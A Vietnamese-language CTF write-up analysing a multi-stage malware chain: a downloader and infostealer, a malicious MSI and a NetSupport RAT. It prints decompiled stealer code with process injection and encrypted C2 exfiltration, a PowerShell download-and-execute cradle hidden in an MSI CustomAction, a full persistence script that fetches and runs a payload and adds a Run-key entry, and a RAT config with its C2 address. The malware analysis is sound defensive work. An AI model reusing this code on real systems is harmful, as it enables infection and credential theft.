    || (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001712)(v90, "PassManagers")
    || (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001712)(v90, "Browsers")
    || (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001712)(v90, "Telegram")
    || (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001712)(v90, "FileZilla")
    || (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001712)(
                       v90,
                       "OpenVPN Connect") )
  {
    goto LABEL_156;
  }
  wsprintfA((LPSTR)v93, "%s\\*", (const char *)v90);
  FirstFileA = FindFirstFileA((LPCSTR)v93, (LPWIN32_FIND_DATAA)v95);
  if ( FirstFileA != (HANDLE)-1LL )
  {
    while ( LOBYTE(v95[0].szExeFile[0]) == 46 || !strcmp((const char *)v95[0].szExeFile, "SystemInfo.txt") )
    {
      NextFileA = FindNextFileA(FirstFileA, (LPWIN32_FIND_DATAA)v95);
      if ( !NextFileA )
        goto LABEL_151;
    }
    NextFileA = 1;
LABEL_151:
    FindClose(FirstFileA);
    if ( NextFileA )
    {
LABEL_156:
      do
      {
        v64 = ((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *, __int64, char *))sub_140006578)(
                v90,
                "152.42.203.28",
                5555,
                v84);
        v65 = v64;
        if ( v64 )
        {
          v65 = 1;
        }
        else if ( v26 != 2 )
        {
          Sleep(0x7D0u);
        }
        ++v26;
      }
      while ( v26 != 3 && (v65 & 1) == 0 );
    }
  }
  ((void (__fastcall *)(struct _STARTUPINFOA *))sub_1400017C0)(v90);
  return 0;
}
```
</details>

Đây là toàn bộ phần source chính của stage2 này và nó thực hiện khá nhiều chức năng, nên bây giờ mình sẽ phân tích theo từng hàm đảm nhiệm từng chức năng chính trong hàm lớn **sub_1400018CD()**: 

- Thực hiện cài đặt về file install.msi từ url: `http://138.2.62.171:443/install.msi`
  - Lưu file install.msi vừa tải về thành file `vrf%lu.msi`, ở đây mình cần giải thích 1 tí về cách lưu file của malware vì nó khá mới với mình:
  > Ở đây phần lưu file và chạy tiến trình `msiexec.exe` hơi rối một chút
  > - Đầu tiên attacker thực hiện gán path thư mục `Temp` vào bên trong giá trị `v91`
  > - Sau đó `wsprintfA((LPSTR)v93, "%s~vrf%lu.msi", (const char *)v91, TickCount);` -> cập nhật biến `v93` sẽ chứa 1 path như sau: `C:\Users\duy\AppData\Local\Temp\~vrf123456.msi`.
  > - Tiếp theo là ghi toàn bộ path trên là giá trị của `v93` vào `%s` -> có tác dụng là chèn chuỗi, nó sẽ gán toàn bộ command thực thi tải về 1 file `.msi` từ tiến trình `msiexec.exe` bằng giá trị `v95` -> `wsprintfA((LPSTR)v95, "msiexec.exe /i \"%s\" /qn", (const char *)v93);` - Lúc này `"%s\"` có giá trị là `v93`.
  > - Cuối cùng là thực thi tạo 1 process và chạy tiến trình trong giá trị `v95`

> Ở đây mình giải thích 1 tí về lệnh chạy process msiexec.exe - là 1 process đảm nhận việc install, update hoặc là uninstall các file có định dạng `.msi`.
> tham số `/i` -> install + `\"%s\"` -> nhận chuỗi từ giá trị `v93` mình đã nói ở trên, và tham số `/qn` tải về âm thầm không thông báo trên screen của victim.

- Tiếp theo là phần code thực hiện thu thập thông tin của hệ thống victim:

```
((void (__fastcall *)(char *, char *))sub_1400027E1)(v78, v79);
sub_14000281B(v85, v80, v86, (__int64)v69);
sub_140002949((LPSTR)v87, v81, v75, v74);
sub_140002A55(v82);
((void (__fastcall *)(DWORD *))sub_140002B41)(v88);
sub_140005125((LPSTR)v89);
GetSystemTime(&v73);

wsprintfA(
  (LPSTR)v90,
  "%s\\sysinfo_%s_%s_%02d%02d%04d%02d%02d",
  (const char *)v89,
  (const char *)&v72,
  v76,
  v73.wDay,
  v73.wMonth,
  v73.wYear,
  v73.wHour,
  v73.wMinute);
CreateDirectoryA((LPCSTR)v90, 0);
((void (__fastcall *)(struct _STARTUPINFOA *))sub_140006D6E)(v90);
```
> Dùng để thu thập:
> - computername / username
> - Windows / install date / timezone
> - local time / date
> - đường dẫn gốc để thực hiệ staging

- Sau đó là hàm thực hiện tải về file `chromelevator.bin` -> Dùng để thu thập các thông tin khác của các browser chromium.
- Tạo thêm folder chromelevator_output để nhận về các thông tin mà file malware kia dump ra
- Tạo 1 staging Browser.
- Cuối cùng là lưu file `chromelevator.bin` thành file `melevator.bin`.
```c
if ( !(unsigned int)sub_1400034F1() )
  goto LABEL_131;

v70 = 0;
v38 = (void *)sub_140002B8F("http://138.2.62.171:443/chromelevator.bin");
...
for ( n = Process32FirstW(Toolhelp32Snapshot, v95); ; n = Process32NextW(Toolhelp32Snapshot, v95) )
{
  ...
  if ( !_wcsicmp(v95[0].szExeFile, aS_8) && v67 != v95[0].th32ProcessID )
  {
    ...
    v45 = OpenProcess(0x42Au, 0, v95[0].th32ProcessID);
    if ( v45 )
      break;
  }
}
...
v48 = (DWORD (__stdcall *)(LPVOID))VirtualAllocEx(v46, 0, v70, 0x3000u, 0x40u);
if ( v48 )
{
  if ( WriteProcessMemory(v47, v48, v38, v70, 0) )
  {
    RemoteThread = CreateRemoteThread(v47, 0, 0, v48, 0, 0, 0);
wsprintfA((LPSTR)v91, "%s\\chromelevator_output", (const char *)v89);
wsprintfA((LPSTR)v95, "%s\\Browsers", (const char *)v90);
while ( GetFileAttributesA((LPCSTR)v91) == -1 )
{
  Sleep(0x3E8u);
  if ( !--v56 )
  {
    v55 = (DWORD *)v93;
    GetTempPathA(0x104u, (LPSTR)v93);
    ...
    wsprintfA((LPSTR)v93 + v57, "chromelevator_output");
    if ( GetFileAttributesA((LPCSTR)v93) == -1 )
      goto LABEL_131;
    break;
  }
}
CreateDirectoryA((LPCSTR)v95, 0);
((void (__fastcall *)(DWORD *, PROCESSENTRY32W *))sub_1400048FA)(v55, v95);
((void (__fastcall *)(DWORD *))sub_1400017C0)(v55);
```

- Thực hiện tạo 1 file `Systeminfo.txt` để nhận các thông tin như:
  - ip
  - country
  - date
  - GUID
  - ...

- Cuối cùng là lấy thêm các thông giá trị về wallet, browserPassManager, Telegrams, FileZilla

-> Đây là malware thực hiện downloader và Infostealer -> thông qua lấy cấp thông tin về chromium, wallet, browsers, telegram,..

Cuối cùng là hàm thực hiện mã hóa các giá trị được thu thập được và gửi về cho server, nằm ở gần cuối của strings:

<img width="1991" height="1450" alt="image" src="https://github.com/user-attachments/assets/3a3403f8-c56c-4d1c-879c-aa4e1bbf8e0a" />

<details>
    <summary>function encrypted/decrypted aes</summary>

```c
__int64 __fastcall sub_14000577B(char *cp, u_short a2, const char *a3, _BYTE *a4, int a5, _BYTE *a6)
{
  SOCKET v10; // rax
  SOCKET v11; // rbx
  __int64 v12; // r9
  ULONG v13; // r9d
  int v14; // eax
  void *v15; // rcx
  __int16 v16; // ax
  unsigned int v17; // r15d
  unsigned int v18; // eax
  int v19; // edi
  bool v20; // zf
  __int64 result; // rax
  unsigned int v22; // [rsp+30h] [rbp-2E8h]
  sockaddr name; // [rsp+48h] [rbp-2D0h] BYREF
  UCHAR pbBuffer[16]; // [rsp+58h] [rbp-2C0h] BYREF
  char buf[16]; // [rsp+68h] [rbp-2B0h] BYREF
  _BYTE v26[32]; // [rsp+78h] [rbp-2A0h] BYREF
  unsigned int v27[8]; // [rsp+98h] [rbp-280h] BYREF
  char optval[128]; // [rsp+B8h] [rbp-260h] BYREF
  WSAData WSAData; // [rsp+138h] [rbp-1E0h] BYREF

  if ( !cp )
    return 0;
  if ( !a3 )
    return 0;
  if ( !*a3 )
    return 0;
  if ( a5 <= 7 || a4 == 0 )
    return 0;
  if ( !a6 )
    return 0;
  *a6 = 0;
  *a4 = 0;
  v22 = strlen(a3);
  if ( v22 > 0x100 || WSAStartup(0x202u, &WSAData) )
    return 0;
  v10 = socket(2, 1, 0);
  v11 = v10;
  if ( v10 == -1 )
    goto LABEL_34;
  *(_DWORD *)optval = 15000;
  setsockopt(v10, 0xFFFF, 4101, optval, 4);
  ((void (__fastcall *)(SOCKET, __int64, __int64, char *, int))setsockopt)(v11, 0xFFFF, 4102, optval, 4);
  name.sa_family = 2;
  *(_WORD *)name.sa_data = htons(a2);
  *(_DWORD *)&name.sa_data[2] = inet_addr(cp);
  if ( connect(v11, &name, 16) < 0
    || (sub_140005370("lmao_ez_sysinfo_aes256_key_2026!!", 33, v26, 2),
        qmemcpy(optval, "lmao_ez_sysinfo_aes256_key_2026!!", 0x21u),
        optval[33] = 1,
        sub_140005370(optval, 34, v27, v12),
        BCryptGenRandom(0, pbBuffer, 0x10u, v13))
    || send(v11, (const char *)pbBuffer, 16, 0) != 16 )
  {
    closesocket(v11);
LABEL_34:
    WSACleanup();
    return 0;
  }
  sub_1400051B0(&unk_14032E560, v26, pbBuffer);
  v14 = recv(v11, buf, 16, 0);
  v15 = &unk_14032E560;
  if ( v14 != 16 )
  {
LABEL_33:
    sub_140005338(v15);
    closesocket(v11);
    goto LABEL_34;
  }
  sub_1400051B0(&unk_14032E520, v27, buf);
  v27[0] = -50331649;
  if ( (unsigned int)sub_1400053B0(v11, v27, 4) != 4 )
    goto LABEL_32;
  LOWORD(v27[0]) = 0;
  LOBYTE(v16) = BYTE1(v22);
  HIBYTE(v16) = v22;
  HIWORD(v27[0]) = v16;
  if ( (unsigned int)sub_1400053B0(v11, v27, 4) != 4
    || (unsigned int)sub_1400053B0(v11, a3, v22) != v22
    || (unsigned int)sub_14000541A(v11, v27, 4) != 4 )
  {
    goto LABEL_32;
  }
  v17 = a5 - 1;
  v18 = _byteswap_ulong(v27[0]);
  if ( a5 - 1 > v18 )
    v17 = v18;
  if ( v17 && v17 != (unsigned int)sub_14000541A(v11, a4, v17)
    || (a4[v17] = 0, (unsigned int)sub_14000541A(v11, a6, 2) != 2) )
  {
LABEL_32:
    sub_140005338(&unk_14032E560);
    v15 = &unk_14032E520;
    goto LABEL_33;
  }
  a6[2] = 0;
  if ( *a6 == 32 && a6[1] == 32 )
    *a6 = 0;
  v19 = sub_14000541A(v11, optval, 6);
  sub_140005338(&unk_14032E560);
  sub_140005338(&unk_14032E520);
  closesocket(v11);
  WSACleanup();
  if ( v19 == 6 )
  {
    v20 = memcmp(optval, "BLOCKED", 6u) == 0;
    result = 0xFFFFFFFFLL;
    if ( v20 )
      return result;
    if ( !memcmp(optval, "ALLOWED", 6u) )
      return *a4 != 0;
  }
  return 0;
}
```
</details>

Toàn bộ source thực hiện encrypted data gửi về cho server bằng **key: lmao_ez_sysinfo_aes256_key_2026!!**, và **iv = gen từ 16 bytes đầu của ciphertext**, Mode AES-CBC.

Tới đây mình sẽ tiếp tục bước qua stage3 tải về file `install.msi và file chromelevator.bin` để theo dõi tiếp chain attack là gì, nhưng giờ mình sẽ trả lời tiếp các câu hỏi trong stage này, và các câu hỏi chưa trả lời trong stage trước:


```
Q5: Next stage C&C server?
     (Example: 1.1.1.1)
> 152.42.203.28 -> tìm thấy ở stage1 khi thực hiện tải về file malware stage2

Q6: Little secret used to access the next stage payload?
     (Example: idkhowtomakeanexampleforthislol)
> missav -> viết ở dạng Little Endian ở stage1

Q7: Next stage type of malware?
     (Example: ransomware)
> infostealer -> thông qua các thông tin mà malware thu thập và gửi về cho server.

Q8: What is the final C&C server found in the second binary?
     (Example: 192.168.1.111)
> 138.2.62.171 -> Ip host thực hiện tải về 2 file install.msi và chromelevator.bin

Q9: What is the encryption key used for the C&C communication channel?
     (Example: idkhowtomakeanexampleforthistoo:))
> lmao_ez_sysinfo_aes256_key_2026!! -> key tìm được trong hàm thực hiện mã hóa thông tin gửi về cho server


```

Bây giờ mình thực hiện tải về 2 file `install.msi` và `chomrelevator.bin` với user agent missav:

<img width="1484" height="576" alt="image" src="https://github.com/user-attachments/assets/f268710c-6b79-4796-850d-d350e8f1abe7" />

Ở đây mình có googling một chút về file `.msi` và cách parse file `.msi` này như thế nào, thì mình có tìm được 1 bài blog viết khá đầy đủ là: https://www.linkedin.com/posts/morad-rawashdeh_dfir-df-msi-activity-7306938343978614784-TY-o

> Đầu tiên thì file `.msi` là một phần mềm cài đặt file application trên windows, giúp hệ thống install và uninstall dễ dàng. Và mình cũng tìm hiểu thêm về sự khác nhau của file exe và msi ở [đây](https://intezer.com/blog/how-to-analyze-malicious-msi-installer-files/)
> - Họ nói là: file `.msi` được thiết kế riêng cho quá trình cài đặt trên Windows, có cấu trúc rõ ràng ở dạng database -> có các bảng bên trong. Còn file `.exe` là file execution dùng để thực thi chương trình, hoặc làm các công việc khác nhau.
> - Một yếu tố quan trọng khiến cho file `.msi` thường được dùng để inject vào command thực thi lệnh tải xuống payload nó nằm ở chính cấu trúc database của file `.msi`, bên trong các tables của cấu trúc file `.msi` thì có 1 tales là **CustomAction** -> cho phép tự config các hành động, ở đây chính là nơi attacker có thể sử dụng để: tải về 1 file exe, .dll, thực hiện execution bên trong,...

Bên trong blog của linkein cũng có ghi 1 tools của Linux dùng để parse file `.msi` là `msitools`, nên mình bắt đầu tiếp tục phân tích bên trong linux:

<img width="1450" height="666" alt="image" src="https://github.com/user-attachments/assets/f133d1f8-f756-4a6e-8dac-6e222cad696d" />

Ở đây chúng ta sẽ dùng lệnh `msiinfo table <file>` để thực hiện in ra toàn bộ tables trong database của file `.msi`, và mình chỉ tập trung vào table CustomAction:

Tiếp tục dùng lệnh `msiinfo export install.msi CustomAction` -> lấy ra toàn bộ data bên trong table này

```
┌──(nhduydeptrai㉿tobi)-[/mnt/…/kali_linux_real_machine/CTF/KMA_CTF_2026/MrRobot]
└─$ msiinfo export install.msi CustomAction
Action  Type    Source  Target  ExtendedType
s72     i2      S72     S0      I4
CustomAction    Action
AI_SET_ADMIN    51      AI_ADMIN        1
AI_InstallModeCheck     1       aicustact.dll   UpdateInstallMode
AI_SHOW_LOG     65      aicustact.dll   LaunchLogFile
AI_PREPARE_UPGRADE      65      aicustact.dll   PrepareUpgrade
AI_DATA_SETTER  51      PowerShellScriptInline  DigitallySignScript1Flags6LaunchDirParamsScript$vid = -join ((65..90) + (97..122) | Get-Random -Count 8 | % [\{][\[]char[\]]$_[\}]); iex((New-Object Net.WebClient).DownloadString("http://138.2.62.171:443/captcha.php"))ScriptPreambleparam(
  [\[]alias("propFile")[\]]      [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $msiPropOutFilePath
 ,[\[]alias("propSep")[\]]       [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $msiPropKVSeparator
 ,[\[]alias("lineSep")[\]]       [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $msiPropLineSeparator
 ,[\[]alias("scriptFile")[\]]    [\[]Parameter(Mandatory=$true)[\]] [\[]string[\]] $userScriptFilePath
 ,[\[]alias("scriptArgsFile")[\]][\[]Parameter(Mandatory=$false)[\]][\[]string[\]] $userScriptArgsFilePath
 ,[\[]Parameter(Mandatory=$true)[\]]                          [\[]string[\]] $testPrefix
 ,[\[]switch[\]]                                                       $isTest
 )

Function AI_GetMsiProperty( [\[]Parameter(Mandatory=$true)[\]]  [\[]string[\]] $name
                          , [\[]Parameter(Mandatory=$false)[\]] $testValue = $null
                          )
[\{]
  if ($isTest -and ($testValue -ne $null))
  [\{]
    [\[]string[\]] $newData = "$testPrefix$name$msiPropKVSeparator$testValue$msiPropLineSeparator"
    [\[]System.IO.File[\]]::AppendAllText($msiPropOutFilePath, $newData, [\[]System.Text.Encoding[\]]::Unicode)
    return $testValue
  [\}]
  [\[]string[\]] $contentData = Get-Content $msiPropOutFilePath -raw
  [\[]array[\]] $content = $contentData -split $msiPropLineSeparator
  
  [\[]array[\]]::Reverse($content)
  ForEach ($line in $content)
  [\{]
    $lineTokens = $line -split $msiPropKVSeparator
    if ($lineTokens.Count -gt 1 -and $lineTokens[\[]0[\]] -eq $name)
    [\{]
      return $lineTokens[\[]1[\]]
    [\}]
  [\}]
  return ''
[\}]

Function AI_SetMsiProperty( [\[]Parameter(Mandatory=$true)[\]] $name
                          , [\[]Parameter(Mandatory=$false)[\]] $value
                          )
[\{]
  if ($value -eq $null)
  [\{]
    Write-Output "POTENTIAL_BUG: MSI property $name set to an uninitialized/null variable. Initialize empty variables using empty quotes."
  [\}]
  [\[]string[\]] $newData = "$name$msiPropKVSeparator$value$msiPropLineSeparator"
  [\[]System.IO.File[\]]::AppendAllText($msiPropOutFilePath, $newData, [\[]System.Text.Encoding[\]]::Unicode)
[\}]

Set-Alias -name "Get-Property" -value AI_GetMsiProperty
Set-Alias -name "Set-Property" -value AI_SetMsiProperty

try
[\{]
  [\[]string[\]] $userScriptArgs = Get-Content $userScriptArgsFilePath
  
  $userScriptFilePath = $userScriptFilePath.Replace(' ', '` ')
  $userScriptFilePath = $userScriptFilePath.Replace('(', '`(')
  $userScriptFilePath = $userScriptFilePath.Replace(')', '`)')
  $userScriptFilePath = $userScriptFilePath.Replace('$', '`$')
  $userScriptFilePath = $userScriptFilePath.Replace('&', '`&')
  # Simple quotes are problematic, especially when more in a succession
  # e.g. in a username. We need to enclose each bundle of them in a simple quoted string
  # with each contained simple quote being escaped by doubling. N initial quotes => (N+1)*2 final quotes
  $userScriptFilePath = $userScriptFilePath.Replace("''''", "??????????")
  $userScriptFilePath = $userScriptFilePath.Replace("'''",  "????????")
  $userScriptFilePath = $userScriptFilePath.Replace("''",   "??????")
  $userScriptFilePath = $userScriptFilePath.Replace("'",    "????")
  $userScriptFilePath = $userScriptFilePath.Replace('?',    "'")
  
  Invoke-Expression "$userScriptFilePath $userScriptArgs"

  if ($LastExitCode -ne $null)
  [\{]
    exit $LastExitCode;
  [\}]
[\}]
catch
[\{]
   Write-Output "ERROR: $($_.Exception.Message)"
   Exit 0x23E #ERROR_UNHANDLED_EXCEPTION
[\}]

PowerShellScriptInline  1025    PowerShellScriptLauncher.dll    RunPowerShellScript
AI_DOWNGRADE    19              4010
AI_DpiContentScale      1       aicustact.dll   DpiContentScale
AI_EnableDebugLog       321     aicustact.dll   EnableDebugLog
AI_PRESERVE_INSTALL_TYPE        65      aicustact.dll   PreserveInstallType
AI_RESTORE_LOCATION     65      aicustact.dll   RestoreLocation
AI_ResolveKnownFolders  1       aicustact.dll   AI_ResolveKnownFolders
AI_STORE_LOCATION       51      ARPINSTALLLOCATION      [APPDIR]
AI_CORRECT_INSTALL      51      AI_INSTALL      {}
SET_APPDIR      307     APPDIR  [AppDataFolder][Manufacturer]\[ProductName]
SET_SHORTCUTDIR 307     SHORTCUTDIR     [ProgramMenuFolder][ProductName]
SET_TARGETDIR_TO_APPDIR 51      TARGETDIR       [APPDIR]
AI_SET_RESUME   51      AI_RESUME       1
AI_SET_INSTALL  51      AI_INSTALL      1
AI_SET_MAINT    51      AI_MAINT        1
AI_SET_PATCH    51      AI_PATCH        1
AI_DETECT_MODERNWIN     1       aicustact.dll   DetectModernWindows
AI_DETECT_WINTHEME      65      aicustact.dll   DetectWindowsTheme

```

Ở đây chúng ta sẽ nhìn thấy 1 command powershell được inject bên trong:

<img width="1108" height="121" alt="image" src="https://github.com/user-attachments/assets/695b0189-39dc-4d29-99cd-702bb9eb681f" />


```powershell
PowerShellScriptInline  DigitallySignScript1Flags6LaunchDirParamsScript$vid = -join ((65..90) + (97..122) | Get-Random -Count 8 | % [\{][\[]char[\]]$_[\}]); iex((New-Object Net.WebClient).DownloadString("http://138.2.62.171:443/captcha.php"))ScriptPreambleparam(
```

Lệnh này đang thực hiện gọi ra powershell để thực hiện hành động chính là tải về file `capcha.php` từ url `http://138.2.62.171:443/captcha.php`, mình nghĩ đây chính là stage3 của chain này, giờ mình sẽ thực hiện tải file script php này về xem thử:

> À quên tới đây mình cũng trả lời được câu hỏi thứ 10 của challenge:

```
Q10: Huh? The msi file ran something? Where is it?
     (Example: https://www.youtube.com/watch?v=dQw4w9WgXcQ)
> http://138.2.62.171:443/captcha.php
```


<img width="1113" height="204" alt="image" src="https://github.com/user-attachments/assets/2a66789a-93be-477d-aa8f-745af130d483" />

> Vì mình không còn thấy yêu cầu sử dụng user agent nữa nên mình k dùng tham số -U khi dùng wget.

Bên trong file capcha.php là 1 script thực hiện persistence như sau:

```powershell
$ided12 = "98c5aa8185604"

try {
    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=started" -UseBasicParsing -ErrorAction SilentlyContinue
} catch { $null }

$dir3961 = "UPD-AD5F3D41-08C9-4BB4-A661-ABD8BA3603E3"
$path07ae = New-Item -Path "$env:APPDATA\$dir3961" -ItemType Directory -Force

$zip2f8d = "$path07ae\software.zip"
try {
    Invoke-WebRequest -Uri "http://138.2.62.171:443/downloads/AP-52163787-D405-4828-BBDD-09BB036BF5B3.zip" -OutFile $zip2f8d -ErrorAction Stop
} catch {
    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=failed" -UseBasicParsing -ErrorAction SilentlyContinue
    exit 1
}

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zip2f8d, $path07ae)
} catch {
    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=failed" -UseBasicParsing -ErrorAction SilentlyContinue
    exit 1
}

Remove-Item -Path $zip2f8d -Force -ErrorAction SilentlyContinue

$exe7563 = "$path07ae\client32.exe"
Start-Process -FilePath $exe7563 -WindowStyle Hidden -ErrorAction SilentlyContinue

try {
    if (Test-Path $exe7563) {
        $reg2fdb = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $reg2fdb -Name "SystemUpdate_$ided12" -Value "`"$exe7563`"" -Type String -Force
    }
} catch { $null }

try {
    $null = Invoke-WebRequest -Uri "http://138.2.62.171:443/track.php?vid=$ided12&action=completed" -UseBasicParsing -ErrorAction SilentlyContinue
} catch { $null }
                                                                                                         
```
Toàn bộ script thực hiện các chức năng sau:

- Đầu tiên thực hiện tạo 1 file software.zip nằm trong thư mục `UPD-AD5F3D41-08C9-4BB4-A661-ABD8BA3603E3` ở folder parent là AppData dùng để nhận toàn bộ file `AP-52163787-D405-4828-BBDD-09BB036BF5B3.zip`.
- Sau đó mỗi lần thực hiện extract sẽ trả về exit 1.
- Bên trong file zip mà script thực hiện tải xuống và extract ra sẽ có 1 file `client32.exe` -> attacker thực hiện chạy tiến trình client32.exe, sau đó thực hiện persistence bằng cách thêm nó vào key registry `Run` -> persistence mỗi lần mà người dùng đăng nhập vào hệ thống.
- Và sau khi hoàn thành quá trình persistence sẽ tải về file `track.php`.

> ở đây mình có googling về mitre ID của persistence qua registry Run key có mitre ID là: **T1547.001**

<img width="1909" height="1019" alt="image" src="https://github.com/user-attachments/assets/aee9b6df-795b-4dab-84e6-90faa819b3e6" />

```
Q11: What is the MITRE ATT&CK technique ID for the persistence method used by
      this stage's malware? (Example: T1053.005)
> T1547.001 
```
Ở đây mình có thử tải file `track.php` nhưng không được khi server trả về 200 khi kết nối đến nhưng tải về không được, tức là vẫn kết nối được nhưng không tải xuống được file track.php

Mình thực hiện tải xuống file `.zip` và tiếp tục ida file client32.exe thử:

<img width="3079" height="2017" alt="image" src="https://github.com/user-attachments/assets/1dbf11a0-5702-4d1f-b20e-64e53a23d0a0" />

Bước đầu thực hiện strings để tìm host server C2 hay 1 chuỗi có giá trị không có kết quả rồi, nên mình tiếp tục thực hiện mò trong các hàm con thử.

<img width="1519" height="817" alt="image" src="https://github.com/user-attachments/assets/923ac0f0-f168-48fe-bfe8-69e651636326" />

Ở đây mình thấy nó có import vào 1 file `PCICL32.dll`, mình thử check qua nó trong ida lun:

Không thấy thêm gì cả, mình tìm lại các file được extract thì có 1 file `client32.ini` -> file config cho file client32.exe mình check thử:

```
┌──(nhduydeptrai㉿tobi)-[/mnt/…/KMA_CTF_2026/MrRobot/AP-52163787-D405-4828-BBDD-09BB036BF5B3/AP-52163787-D405-4828-BBDD-09BB036BF5B3]
└─$ cat Client32.ini              
0x9a7973d9

[Client]
_present=1
DisableChatMenu=1
DisableClientConnect=1
DisableDisconnect=1
DisableLocalInventory=1
DisableReplayMenu=1
DisableRequestHelp=1
Protocols=3
RADIUSSecret=dgAAAPpMkI7ke494fKEQRUoablcA
RoomSpec=Eval
ShowUIOnConnect=0
silent=1
SKMode=1
SysTray=0
UnloadMirrorOnDisconnect=1
Usernames=*

[_Info]
Filename=C:\Program Files (x86)\NetSupport\NetSupport Manager\client32u.ini

[_License]
quiet=1

[Audio]
DisableAudioFilter=1

[General]
BeepUsingSpeaker=0

[HTTP]
GatewayAddress=161.33.2.236:443
gsk=FM9M=P@PEN;C@GDJ9L=MAPFKHO:P>B
gskmode=0
GSK=FM9M=P@PEN;C@GDJ9L=MAPFKHO:P>B
GSKX=FM9M=P@PEN;C@GDJ9L=MAPFKHO:P>B

[View]
LimitColorbits=4
                                                
```
-> Bên trong này mình thấy có một cụm `HTTP` chứa cấu hình ip:port đến 1 server C2 cuối cùng của attacker `161.33.2.236:443`

Tới đây mình cũng trả lời được câu hỏi cuối cùng của challenge này là C2 server cuối cùng được sử dụng trong chain attacker của attacker:

```
Q12: C&C server of the RAT? (Example: 9.9.9.9)
> 161.33.2.236 -> được config qua giá trị GatewayAddress của file client32.ini
```

Sau khi hoàn thành xong 12 câu hỏi thì mình cũng có được flag:
**KMACTF{https://youtu.be/r9jL-lbE558_D5929CCFDEB6C5FF}**
